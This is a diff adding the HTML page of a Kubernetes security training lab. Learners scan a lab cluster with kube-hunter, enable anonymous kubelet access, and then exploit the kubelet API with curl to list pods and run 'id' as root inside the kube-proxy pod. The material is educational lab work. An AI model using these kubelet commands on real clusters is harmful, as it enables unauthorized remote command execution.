@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Exercise: Kube-Hunter | Abusing and Protecting Kubernetes, Linux and Containers</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Exercise: Kube-Hunter" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://0.0.0.0:10000/exercises/kubernetes-kube-hunter/" />
+<meta property="og:url" content="http://0.0.0.0:10000/exercises/kubernetes-kube-hunter/" />
+<meta property="og:site_name" content="Abusing and Protecting Kubernetes, Linux and Containers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Exercise: Kube-Hunter" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","headline":"Exercise: Kube-Hunter","url":"http://0.0.0.0:10000/exercises/kubernetes-kube-hunter/"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:10000/feed.xml" title="Abusing and Protecting Kubernetes, Linux and Containers" /></head>
+<body><header class="site-header">
+
+    <div class="wrapper"><a class="site-title" rel="author" href="/">Abusing and Protecting Kubernetes, Linux and Containers</a>
+
+      <nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+        <div class="trigger">
+            <a class="page-link" href="/">Exercises</a>
+            <a class="page-link" href="/about/">About</a>
+            <a class="page-link" href="/help/">Help</a>
+        </div>
+      </nav>
+
+      <!-- This is the section that comes from the default minima theme -->
+      
+    </div>
+  </header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post">
+<link rel="stylesheet" href="/assets/css/style.css">
+ <header class="post-header">
+    <h1 class="post-title">Exercise: Kube-Hunter</h1>
+  </header>
+
+
+  <div class="post-content">
+    
+
+    <h2 id="steps">Steps</h2>
+<ol>
+<li>
+<p>Start up a fresh <code>lxterminal</code> by clicking the &quot;sparrow&quot; logo in the bottom-left corner of the screen, clicking run, typing <code>lxterminal</code> and hitting enter. Alternatively, use the hot key sequence below:</p>
+<pre><code>&lt;hold down Alt&gt;&lt;hit F2&gt;lxterminal&lt;HIT the enter key&gt;
+</code></pre></li>
+<li>
+<p>SSH into the control plane node on the cluster:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> /sync/bustakube-node-key root@bustakube-controlplane
+</code></pre></div></div>
+</li>
+<li>
+<p>Switch directory to <code>/root</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /root
+</code></pre></div></div>
+</li>
+<li>
+<p>Pull down the kube-hunter job manifest file, saving it into the current directory:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">github</span><span class="o">=</span><span class="s2">"https://raw.githubusercontent.com/aquasecurity"</span>
+curl <span class="nt">-LO</span> <span class="k">${</span><span class="nv">github</span><span class="k">}</span>/kube-hunter/main/job.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Stage this job to the Kubernetes cluster:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl create <span class="nt">-f</span> job.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>The job creates a pod whose name begins with <code>kube-hunter-</code>. We need to find the pod's name. To make this pod easier to programmatically find, use <code>kubectl</code>'s label selector flag (<code>-l</code>) to search for pods whose <code>job-name</code> label is <code>kube-hunter</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get pods <span class="nt">-l</span> job-name<span class="o">=</span>kube-hunter
+</code></pre></div></div>
+</li>
+<li>
+<p>Now ask for the output to be output to json, but made more specific based on a JSONPath. You can <a href="https://goessner.net/articles/JsonPath/">read more about JSONPath here</a> and <a href="https://kubernetes.io/docs/reference/kubectl/jsonpath/">read more about Kubernetes' JSONPath support here</a>. The important thing to understand about JSONPath is that we can use it to get a specific part of the output. We want to take the first pod in the output (<code>items[0]</code>), dig into its <code>.metadata</code> section, and then get the value of the <code>.name</code> field, so we'll use  the JSONPath <code>{.items[0].metadata.name}</code>.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get pods <span class="nt">-l</span> job-name<span class="o">=</span>kube-hunter <span class="se">\</span>
+  <span class="nt">-o</span> <span class="nv">jsonpath</span><span class="o">=</span><span class="s1">'{.items[0].metadata.name}'</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's assign the output of that command to the variable $pod:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">pod</span><span class="o">=</span><span class="si">$(</span> kubectl get pods <span class="nt">-l</span> job-name<span class="o">=</span>kube-hunter <span class="se">\</span>
+  <span class="nt">-o</span> <span class="nv">jsonpath</span><span class="o">=</span><span class="s1">'{.items[0].metadata.name}'</span> <span class="si">)</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, we need to wait until this &quot;job&quot; pod finishes its run. Here's a while loop in shell that will run <code>kubectl get pod $pod</code> every 5 seconds until the output has &quot;Completed&quot; in it.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while</span> <span class="o">[</span> <span class="si">$(</span>kubectl get pod <span class="nv">$pod</span> | <span class="nb">grep</span> <span class="nt">-c</span> Completed<span class="si">)</span> <span class="nt">-lt</span> 1 <span class="o">]</span> <span class="p">;</span> <span class="k">do
+  </span><span class="nb">echo</span> <span class="s2">"Waiting for kube-hunter to finish"</span>
+  <span class="nb">sleep </span>5
+<span class="k">done</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now that the pod has completed, let's get its output (<code>STDOUT</code> and <code>STDERR</code>) with <code>kubectl logs</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl logs <span class="nv">$pod</span> <span class="o">&gt;</span>kube-hunter-output.txt
+</code></pre></div></div>
+</li>
+<li>
+<p>Take a look at the output:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>less kube-hunter-output.txt
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that the output names several findings and vulnerabilities. We can cross-reference them with kube-hunter's vulnerability knowledge base on by looking up their numbers (the first column of the kube-hunter output) with the items on this page:</p>
+<p><a href="https://aquasecurity.github.io/kube-hunter/kbindex.html">https://aquasecurity.github.io/kube-hunter/kbindex.html</a></p>
+</li>
+<li>
+<p>Follow this link to look up vulnerability <code>KHV005</code>:</p>
+<p><a href="https://aquasecurity.github.io/kube-hunter/kb/KHV005.html">https://aquasecurity.github.io/kube-hunter/kb/KHV005.html</a></p>
+</li>
+<li>
+<p>None of these vulnerabilities are show-stoppers, so let's introduce a bigger issue. Turn on the <code>kubelet</code>'s anonymous mode on the two worker nodes via Bustakube's <code>toggle-kubelet-anonymous.sh</code> script:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>node <span class="k">in </span>bustakube-node-1 bustakube-node-2 <span class="p">;</span> <span class="k">do
+  </span>ssh <span class="nv">$node</span> <span class="s2">"/usr/local/bin/toggle-kubelet-anonymous.sh activate"</span>
+<span class="k">done</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, let's run <code>kube-hunter</code> again. First, delete the original <code>kube-hunter</code> job:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl delete job kube-hunter
+</code></pre></div></div>
+</li>
+<li>
+<p>Create a new job using the same <code>job.yaml</code> manifest file that we used earlier.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl create <span class="nt">-f</span> job.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Get the new pod's name, using the same JSONPath technique:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">pod</span><span class="o">=</span><span class="si">$(</span>kubectl get pods <span class="nt">-l</span> job-name<span class="o">=</span>kube-hunter <span class="se">\</span>
+  <span class="nt">-o</span> <span class="nv">jsonpath</span><span class="o">=</span><span class="s1">'{.items[0].metadata.name}'</span> <span class="si">)</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Again, wait for the pod's work to complete:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while</span> <span class="o">[</span> <span class="si">$(</span>kubectl get pod <span class="nv">$pod</span> | <span class="nb">grep</span> <span class="nt">-c</span> Completed<span class="si">)</span> <span class="nt">-lt</span> 1 <span class="o">]</span> <span class="p">;</span> <span class="k">do
+  </span><span class="nb">echo</span> <span class="s2">"Waiting for kube-hunter to finish"</span>
+  <span class="nb">sleep </span>5
+<span class="k">done</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>This time, write the output to a file called <code>kube-hunter-with-kubelet-anonymous.txt</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl logs <span class="nv">$pod</span> <span class="o">&gt;</span>kube-hunter-with-kubelet-anonymous.txt
+</code></pre></div></div>
+</li>
+<li>
+<p>Take a look at this round's findings:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>less kube-hunter-with-kubelet-anonymous.txt
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that we have more findings, all related to the fact that any network connection to the kubelet can gain information about pods and run commands inside them.</p>
+</li>
+<li>
+<p>Let's look up one of these new findings, <code>KHV040</code>, via this link:</p>
+<p><a href="https://aquasecurity.github.io/kube-hunter/kb/KHV040.html">https://aquasecurity.github.io/kube-hunter/kb/KHV040.html</a></p>
+</li>
+<li>
+<p>The knowledge base article at that link tells us that we can remediate the issue by disabling the <code>--enable-debugging-handlers</code> flag. It also refers us to the Kubernetes documentation via this link:</p>
+<p><a href="https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/#options">https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/#options</a></p>
+</li>
+<li>
+<p>Notice how that link's information about <code>--enable-debugging-handlers</code> tells us that the default is <code>true</code>, but also tells us that this method of remediation has been deprecated, in favor of modifying the kubelet's config file. The relevant section of the page is quoted below. This is a useful experience. Kubernetes is a fast-moving, actively-developed project. It's difficult for external tools, articles, and guides to keep up to date.</p>
+<pre><code>--enable-debugging-handlers     Default: `true`
+
+Enables server endpoints for log collection and local running of containers and commands. (DEPRECATED: This parameter should be set via the config file specified by the Kubelet's `--config` flag. See [kubelet-config-file](https://kubernetes.io/docs/tasks/administer-cluster/kubelet-config-file/) for more information.)
+</code></pre></li>
+<li>
+<p>We'll run <code>kube-hunter</code> again, but first we need to delete the last <code>kube-hunter</code> job:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl delete job kube-hunter
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, let's do one more <code>kube-hunter</code> run, allowing <code>kube-hunter</code> to run its active tests. Use <code>yq</code> to add the <code>--active</code> flag to the <code>args</code> field in the job's container definition. You can pass the output from <code>yq</code> directly into <code>kubectl create -f</code> by specifying the hyphen (<code>-</code>) character. By convention in the Linux shell, the hyphen indicates that the command should read STDIN instead of a file.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>job.yaml |
+yq <span class="s1">'.spec.template.spec.containers[0].args += ["--active"] '</span> <span class="se">\</span>
+| kubectl create <span class="nt">-f</span> -
+</code></pre></div></div>
+</li>
+<li>
+<p>Get the new pod name.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">pod</span><span class="o">=</span><span class="si">$(</span>kubectl get pods <span class="nt">-l</span> job-name<span class="o">=</span>kube-hunter <span class="se">\</span>
+  <span class="nt">-o</span> <span class="nv">jsonpath</span><span class="o">=</span><span class="s1">'{.items[0].metadata.name}'</span> <span class="si">)</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Wait for the pod's work to complete:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while</span> <span class="o">[</span> <span class="si">$(</span>kubectl get pod <span class="nv">$pod</span> | <span class="nb">grep</span> <span class="nt">-c</span> Completed<span class="si">)</span> <span class="nt">-lt</span> 1 <span class="o">]</span> <span class="p">;</span> <span class="k">do
+  </span><span class="nb">echo</span> <span class="s2">"Waiting for kube-hunter to finish"</span>
+  <span class="nb">sleep </span>5
+<span class="k">done</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Write the output to a file called <code>kube-hunter-active-mode.txt</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl logs <span class="nv">$pod</span> <span class="o">&gt;</span>kube-hunter-active-mode.txt
+</code></pre></div></div>
+</li>
+<li>
+<p>Take a look at the new output file:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>less kube-hunter-active-mode.txt
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that we have one new vulnerability that wasn't found before you enabled active mode. It is number <code>KHV051</code>.</p>
+</li>
+<li>
+<p>Read the knowledge base article on <code>KHV051</code>:</p>
+<p><a href="https://aquasecurity.github.io/kube-hunter/kb/KHV051.html">https://aquasecurity.github.io/kube-hunter/kb/KHV051.html</a></p>
+</li>
+<li>
+<p>Let's exploit the finding.</p>
+</li>
+<li>
+<p>Let's communicate with the read-and-write API on the kubelet on node-1 node, which listens on TCP port <code>10250</code>.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-ks</span> https://10.23.58.41:10250/runningpods/
+</code></pre></div></div>
+</li>
+<li>
+<p>Note that what you received back was JSON output – you can read it, but it's much easier to read if you parse it with a tool.  The next six intermediate steps will let you experiment with the <code>jq</code> tool, short for JSON query. If you'd like, skip these steps and go straight to the step that reads &quot;Now, let's get a list of all the pod names, with their namespaces.&quot;</p>
+</li>
+<li>
+<p>Let's get a list of the entries in this JSON output's items array.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-ks</span> https://10.23.58.41:10250/runningpods/ | jq <span class="s1">'.items'</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now let's see if we can get just the first item.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-ks</span> https://10.23.58.41:10250/runningpods/ | jq <span class="s1">'.items[0] '</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now let's see if we can get just the name entry for the first item.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-ks</span> https://10.23.58.41:10250/runningpods/ | <span class="se">\</span>
+  jq <span class="s1">'.items[0] | { name: .metadata.name }'</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Note that the pod name we got probably wasn't the same pod name as when we got the first item.  This list is coming out unordered, different each time.  Run that same command again to see.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-ks</span> https://10.23.58.41:10250/runningpods/ | <span class="se">\</span>
+  jq <span class="s1">'.items[0] | { name: .metadata.name }'</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's add the pod's namespace to that.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+curl <span class="nt">-ks</span> https://10.23.58.41:10250/runningpods/ | <span class="se">\</span>
+  jq <span class="s1">'.items[0] | { name: .metadata.name , namespace: .metadata.namespace}'</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>To work with the whole set of items, we'll need to send <code>.items</code> through an array sifter.  We run:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-ks</span> https://10.23.58.41:10250/runningpods/ | jq <span class="s1">'.items | .[]'</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, let's get a list of all the pod names, with their namespaces.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-ks</span> https://10.23.58.41:10250/runningpods/ | <span class="se">\</span>
+  jq <span class="s1">'.items.[] | {name: .metadata.name , ns: .metadata.namespace }'</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's parse out the name of the pod that's running <code>kube-proxy</code>. First, let's write a <code>jq</code> line that gives us the name of the first container in every pod:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-ks</span> https://10.23.58.41:10250/runningpods/ | <span class="se">\</span>
+  jq <span class="s1">'.items[] | .spec.containers[0].name'</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Next, let's tell <code>jq</code> to give us the full detail on all the items, but to send that through a <code>select</code> filter that says we only want an item if its first container name is <code>&quot;kube-proxy&quot;</code>.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-ks</span> https://10.23.58.41:10250/runningpods/ | <span class="se">\</span>
+  jq <span class="s1">'.items[] | select( .spec.containers[0].name == "kube-proxy") '</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Here was the output from our test system:</p>
+<pre><code>{
+&quot;metadata&quot;: {
+    &quot;name&quot;: &quot;kube-proxy-fgtk4&quot;,
+    &quot;namespace&quot;: &quot;kube-system&quot;,
+    &quot;uid&quot;: &quot;201453bf-47b7-4b77-a4ce-f9fad3f6d3b8&quot;,
+    &quot;creationTimestamp&quot;: null
+},
+&quot;spec&quot;: {
+    &quot;containers&quot;: [
+    {
+        &quot;name&quot;: &quot;kube-proxy&quot;,
+        &quot;image&quot;: &quot;sha256:93283b563d4777db762f6160b7f5a88942a2d6b3c115df49e7e1f366708dedb4&quot;,
+        &quot;resources&quot;: {}
+    }
+    ]
+},
+&quot;status&quot;: {}
+}
+</code></pre></li>
+<li>
+<p>Now, tell <code>jq</code> to just give us the name of that pod:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+curl <span class="nt">-ks</span> https://10.23.58.41:10250/runningpods/ | jq <span class="se">\</span>
+<span class="s1">'.items[] |select( .spec.containers[0].name=="kube-proxy")| .metadata.name'</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Finally, set a variable to that output - use <code>jq</code>'s <code>-r</code> (raw) flag so the output doesn't have quotation (&quot;) marks around it.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nv">pod</span><span class="o">=</span><span class="si">$(</span> curl <span class="nt">-ks</span> https://10.23.58.41:10250/runningpods/ | jq <span class="nt">-r</span> <span class="se">\</span>
+<span class="s1">'.items[] |select( .spec.containers[0].name=="kube-proxy")| .metadata.name'</span><span class="si">)</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's use the Kubelet API again, asking that pod to run <code>id</code> for us. The format for the URL on this API call is <code>/run/namespace/pod/container/</code>.  We use a <code>POST</code> request and pass in the command in the argument <code>cmd</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">url</span><span class="o">=</span><span class="s2">"https://10.23.58.41:10250"</span>
+curl <span class="nt">-ks</span> <span class="k">${</span><span class="nv">url</span><span class="k">}</span>/run/kube-system/<span class="nv">$pod</span>/kube-proxy/ <span class="nt">-d</span> <span class="s2">"cmd=id"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that our command ran - here's the output from our test system:</p>
+<pre><code>uid=0(root) gid=0(root) groups=0(root)
+</code></pre></li>
+<li>
+<p>This is the end of our exercise. Please deactivate the anonymous kubelet mode:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>node <span class="k">in </span>bustakube-node-1 bustakube-node-2 <span class="p">;</span> <span class="k">do
+  </span>ssh <span class="nv">$node</span> <span class="s2">"/usr/local/bin/toggle-kubelet-anonymous.sh deactivate"</span>
+<span class="k">done</span>
+</code></pre></div></div>
+</li>
+</ol>
+
+  </div>
+
+  <div class="post-exercise">
+    <h2 id="exercise-done">Done With the Exercise</h2>
+
+<p>Please flip your sticker over so we know how many people are done with the exercise.</p>
+</p>
+    
+
+
+    <h2 id="suspend-vms">Virtual Machine Management Tips</h2>
+
+<p> If you want to see what virtual machines are currently running, you can run:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  virsh list  
+</code></pre></div>    </div>
+    
+<p>If you have virtual machines using RAM and CPU, you can suspend all of them with:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  sudo /sync/bin/suspend-all-vms.sh 
+</code></pre></div>    </div>
+
+    
+
+  </div>
+
+</article>
+<script src="/assets/scripts/clipboard.min.js"></script>
+<script src="/assets/scripts/copy.js"></script>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Abusing and Protecting Kubernetes, Linux and Containers</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Abusing and Protecting Kubernetes, Linux and Containers</li><li><a class="u-email" href="mailto:contact@inguardians.com">contact@inguardians.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/inguardians"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">inguardians</span></a></li><li><a href="https://www.twitter.com/inguardians"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">inguardians</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p></p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
